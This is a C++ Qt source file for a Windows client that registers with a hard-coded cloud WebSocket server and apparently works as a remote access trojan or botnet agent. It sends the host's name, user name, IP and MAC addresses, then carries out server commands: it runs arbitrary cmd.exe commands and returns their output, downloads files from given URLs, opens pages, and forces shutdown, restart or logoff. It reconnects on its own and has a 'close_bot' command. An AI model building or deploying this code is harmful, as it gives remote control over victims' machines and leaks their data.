#include "mainwindow.h"
#include <QUrl>
#include <QHostInfo>
#include <QProcess>
#include <QDesktopServices>
#include <QCoreApplication>
#include "DownloadThread.h"
#include <QDir>
#include <QJsonDocument>
#include <QJsonObject>
#include <QJsonArray>
#include <QNetworkInterface>
#include <QSysInfo>
#include <QCryptographicHash>
#include <QDateTime>
#include <QDebug>

// UPDATED: Cloud backend WebSocket URL (from web panel Security tab)
#define DEF_WS_URL QUrl("wss://loopjs-backend-361659024403.us-central1.run.app/ws")

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent), m_isRegistered(false)
{
    // Generate unique UUID for this client
    m_clientUuid = generateUuid();
    
    // Create heartbeat timer
    m_heartbeatTimer = new QTimer(this);
    connect(m_heartbeatTimer, &QTimer::timeout, this, &MainWindow::onHeartbeatTimer);
    
    // Setup WebSocket connections
    connect(&m_webSocket, &QWebSocket::connected, this, &MainWindow::onConnected);
    connect(&m_webSocket, &QWebSocket::textMessageReceived, this, &MainWindow::onMessageReceived);
    connect(&m_webSocket, &QWebSocket::disconnected, this, &MainWindow::onDisconnected);
    connect(&m_webSocket, &QWebSocket::errorOccurred, this, &MainWindow::onError);

    qDebug() << "Client UUID:" << m_clientUuid;
    qDebug() << "Connecting to:" << DEF_WS_URL.toString();
    
    m_webSocket.open(DEF_WS_URL);
}

MainWindow::~MainWindow() {
    if (m_heartbeatTimer) {
        m_heartbeatTimer->stop();
    }
}

QString MainWindow::getComputerName()
{
    QHostInfo hostInfo = QHostInfo::fromName(QHostInfo::localHostName());
    return hostInfo.hostName();
}

QString MainWindow::getLocalIPAddress()
{
    // Get first non-localhost IPv4 address
    QList<QHostAddress> addresses = QNetworkInterface::allAddresses();
    for (const QHostAddress &address : addresses) {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && 
            !address.isLoopback()) {
            return address.toString();
        }
    }
    return "127.0.0.1";
}

QString MainWindow::generateUuid()
{
    // Use Qt's built-in UUID generator for RFC 4122 compliant UUIDs
    // This generates a proper UUID v4 format that should pass server validation
    QUuid uuid = QUuid::createUuid();
    
    // Convert to string and remove curly braces
    QString uuidString = uuid.toString(QUuid::WithoutBraces);
    
    qDebug() << "Generated UUID:" << uuidString;
    
    return uuidString;
}

QJsonArray MainWindow::getClientCapabilities()
{
    // Return list of supported features for this client
    QJsonArray capabilities;
    capabilities.append("execute_command");
    capabilities.append("message_box");
    capabilities.append("visit_page");
    capabilities.append("download_execute");
    capabilities.append("shutdown");
    capabilities.append("restart");
    capabilities.append("hibernate");
    capabilities.append("logoff");
    capabilities.append("file_operations");
    
    return capabilities;
}

QJsonObject MainWindow::getSystemInformation()
{
    QJsonObject sysInfo;
    
    // Operating system information
    sysInfo["os"] = QSysInfo::prettyProductName();
    sysInfo["osVersion"] = QSysInfo::productVersion();
    sysInfo["kernel"] = QSysInfo::kernelVersion();
    sysInfo["architecture"] = QSysInfo::currentCpuArchitecture();
    sysInfo["buildAbi"] = QSysInfo::buildAbi();
    
    // Computer and user information
    sysInfo["computerName"] = getComputerName();
    sysInfo["userName"] = qEnvironmentVariable("USERNAME").isEmpty() 
        ? qEnvironmentVariable("USER") 
        : qEnvironmentVariable("USERNAME");
    
    // Network interfaces
    QJsonArray interfaces;
    QList<QNetworkInterface> netInterfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : netInterfaces) {
        if (interface.flags().testFlag(QNetworkInterface::IsUp) && 
            !interface.flags().testFlag(QNetworkInterface::IsLoopBack)) {
            QJsonObject ifaceObj;
            ifaceObj["name"] = interface.humanReadableName();
            ifaceObj["mac"] = interface.hardwareAddress();
            
            QJsonArray addresses;
            for (const QNetworkAddressEntry &entry : interface.addressEntries()) {
                if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                    addresses.append(entry.ip().toString());
                }
            }
            ifaceObj["addresses"] = addresses;
            interfaces.append(ifaceObj);
        }
    }
    sysInfo["networkInterfaces"] = interfaces;
    
    return sysInfo;
}

void MainWindow::sendRegistration()
{
    qDebug() << "Sending registration to server...";
    
    QJsonObject json;
    json["type"] = "register";
    json["uuid"] = m_clientUuid;
    json["computerName"] = getComputerName();
    json["ipAddress"] = getLocalIPAddress();
    json["hostname"] = getComputerName();
    json["platform"] = QSysInfo::prettyProductName();
    
    QString systemDetails = QString("%1 - %2 - Build %3")
        .arg(QSysInfo::prettyProductName())
        .arg(QSysInfo::currentCpuArchitecture())
        .arg(QSysInfo::buildCpuArchitecture());
    json["additionalSystemDetails"] = systemDetails;
    
    // Add capabilities array
    json["capabilities"] = getClientCapabilities();
    
    // Add detailed system information
    json["systemInfo"] = getSystemInformation();
    
    QJsonDocument doc(json);
    QString message = doc.toJson(QJsonDocument::Compact);
    
    qDebug() << "Registration message:" << message;
    m_webSocket.sendTextMessage(message);
}

void MainWindow::sendCapabilityReport()
{
    if (!m_isRegistered) return;
    
    QJsonObject json;
    json["type"] = "capability_report";
    json["uuid"] = m_clientUuid;
    json["capabilities"] = getClientCapabilities();
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
    
    qDebug() << "Capability report sent";
}

void MainWindow::sendHeartbeat()
{
    if (!m_isRegistered) return;
    
    QJsonObject json;
    json["type"] = "heartbeat";
    json["uuid"] = m_clientUuid;
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
    
    qDebug() << "Heartbeat sent";
}

void MainWindow::onConnected()
{
    qDebug() << "Connected to WebSocket server!";
    
    if (m_webSocket.isValid()) {
        // Send registration immediately upon connection
        sendRegistration();
    }
}

void MainWindow::onMessageReceived(const QString& strMessage)
{
    qDebug() << "Received message:" << strMessage;
    
    // Parse JSON message
    QJsonDocument doc = QJsonDocument::fromJson(strMessage.toUtf8());
    if (!doc.isObject()) {
        qWarning() << "Invalid JSON received";
        return;
    }
    
    QJsonObject json = doc.object();
    QString type = json["type"].toString();
    
    // Handle registration success
    if (type == "register_success") {
        qDebug() << "Registration successful!";
        m_isRegistered = true;
        
        // Start heartbeat timer (send every 30 seconds)
        m_heartbeatTimer->start(30000);
        
        // Don't send capability report - server doesn't recognize this message type
        // sendCapabilityReport();
        
        qDebug() << "Client is now fully registered and sending heartbeats";
        return;
    }
    
    // Handle authentication required (shouldn't happen for agents, but handle it)
    if (type == "auth_required") {
        qWarning() << "Server requires authentication";
        return;
    }
    
    // Handle errors
    if (type == "error") {
        QString message = json["message"].toString();
        qWarning() << "Server error:" << message;
        return;
    }
    
    // Handle commands from server
    if (json.contains("cmd")) {
        QString cmd = json["cmd"].toString();
        QString taskId = json["taskId"].toString();
        
        qDebug() << "Received command:" << cmd << "Task ID:" << taskId;
        
        if (cmd == "execute") {
            QString command = json["command"].toString();
            executeCommand(command, taskId);
        }
        else if (cmd == "messagebox") {
            QString title = json["title"].toString();
            QString text = json["text"].toString();
            QString command = QString("msg * %1: %2").arg(title, text);
            QProcess::startDetached("cmd.exe", QStringList() << "/c" << command);
        }
        else if (cmd == "visit_page") {
            QString url = json["url"].toString();
            QDesktopServices::openUrl(QUrl(url));
        }
        else if (cmd == "close_bot") {
            close();
        }
        else if (cmd == "shutdown") {
            QString delay = json["delay"].toString();
            QProcess::startDetached("shutdown", QStringList() << "/s" << "/t" << delay);
        }
        else if (cmd == "restart") {
            QString delay = json["delay"].toString();
            QProcess::startDetached("shutdown", QStringList() << "/r" << "/t" << delay);
        }
        else if (cmd == "hibernate") {
            QString delay = json["delay"].toString();
            QProcess::startDetached("shutdown", QStringList() << "/h" << "/t" << delay);
        }
        else if (cmd == "logoff") {
            QProcess::startDetached("shutdown", QStringList() << "/l");
        }
        else if (cmd == "abort") {
            QProcess::startDetached("shutdown", QStringList() << "/a");
        }
        else if (cmd == "download" || cmd == "download_execute") {
            QString url = json["url"].toString();
            QUrl downloadUrl(url);
            QString fileName = downloadUrl.fileName();
            QString appDirPath = QCoreApplication::applicationDirPath();
            QString fullPath = QDir(appDirPath).filePath(fileName);
            
            DownloadThread *downloadThread = new DownloadThread(downloadUrl, fullPath);
            downloadThread->start();
        }
    }
}

void MainWindow::executeCommand(const QString& command, const QString& taskId)
{
    qDebug() << "Executing command:" << command;
    
    if (command.isEmpty()) {
        sendErrorResponse(taskId, "Empty command received");
        return;
    }
    
    // Create process to execute command
    QProcess *process = new QProcess(this);
    
    // Set timeout for command execution (60 seconds)
    process->setProcessChannelMode(QProcess::MergedChannels);
    
    // Capture output
    connect(process, QOverload<int, QProcess::ExitStatus>::of(&QProcess::finished),
        [this, process, taskId](int exitCode, QProcess::ExitStatus exitStatus) {
            QString output = process->readAllStandardOutput();
            QString errorOutput = process->readAllStandardError();
            
            QString fullOutput = output;
            if (!errorOutput.isEmpty()) {
                fullOutput += "\n[STDERR]\n" + errorOutput;
            }
            
            if (exitStatus == QProcess::CrashExit) {
                fullOutput += "\n[Process crashed]";
            }
            
            fullOutput += QString("\n[Exit Code: %1]").arg(exitCode);
            
            qDebug() << "Command output:" << fullOutput;
            
            // Send output back to server
            if (exitCode == 0 || !fullOutput.isEmpty()) {
                sendCommandOutput(taskId, fullOutput);
            } else {
                sendErrorResponse(taskId, "Command failed with exit code " + QString::number(exitCode));
            }
            
            process->deleteLater();
        }
    );
    
    // Handle process errors
    connect(process, &QProcess::errorOccurred, 
        [this, process, taskId](QProcess::ProcessError error) {
            QString errorMsg;
            switch (error) {
                case QProcess::FailedToStart:
                    errorMsg = "Failed to start command";
                    break;
                case QProcess::Timedout:
                    errorMsg = "Command timed out";
                    break;
                default:
                    errorMsg = "Process error occurred";
                    break;
            }
            sendErrorResponse(taskId, errorMsg);
            process->deleteLater();
        }
    );
    
    // Start command
    process->start("cmd.exe", QStringList() << "/c" << command);
    
    // Check if process failed to start (will be caught by errorOccurred signal)
    if (process->state() == QProcess::NotRunning && process->error() != QProcess::UnknownError) {
        sendErrorResponse(taskId, "Failed to start process");
        process->deleteLater();
    }
}

void MainWindow::sendCommandOutput(const QString& taskId, const QString& output)
{
    qDebug() << "Sending command output for task:" << taskId;
    
    QJsonObject json;
    json["type"] = "output";
    json["taskId"] = taskId;
    json["output"] = output;
    json["status"] = "success";
    json["timestamp"] = QDateTime::currentDateTime().toString(Qt::ISODate);
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
}

void MainWindow::sendErrorResponse(const QString& taskId, const QString& errorMessage)
{
    qDebug() << "Sending error response for task:" << taskId << "Error:" << errorMessage;
    
    QJsonObject json;
    json["type"] = "output";
    json["taskId"] = taskId;
    json["output"] = "";
    json["status"] = "error";
    json["error"] = errorMessage;
    json["timestamp"] = QDateTime::currentDateTime().toString(Qt::ISODate);
    
    QJsonDocument doc(json);
    m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
}

void MainWindow::onDisconnected()
{
    qDebug() << "Disconnected from server";
    m_isRegistered = false;
    
    // Stop heartbeat timer
    if (m_heartbeatTimer) {
        m_heartbeatTimer->stop();
    }
    
    // Try to reconnect after 5 seconds
    QTimer::singleShot(5000, this, [this]() {
        qDebug() << "Attempting to reconnect...";
        m_webSocket.open(DEF_WS_URL);
    });
}

void MainWindow::onError(QAbstractSocket::SocketError socketError)
{
    qWarning() << "WebSocket error:" << socketError << m_webSocket.errorString();
    
    // Try to reconnect after 10 seconds on error
    QTimer::singleShot(10000, this, [this]() {
        qDebug() << "Attempting to reconnect after error...";
        m_webSocket.open(DEF_WS_URL);
    });
}

void MainWindow::onHeartbeatTimer()
{
    sendHeartbeat();
}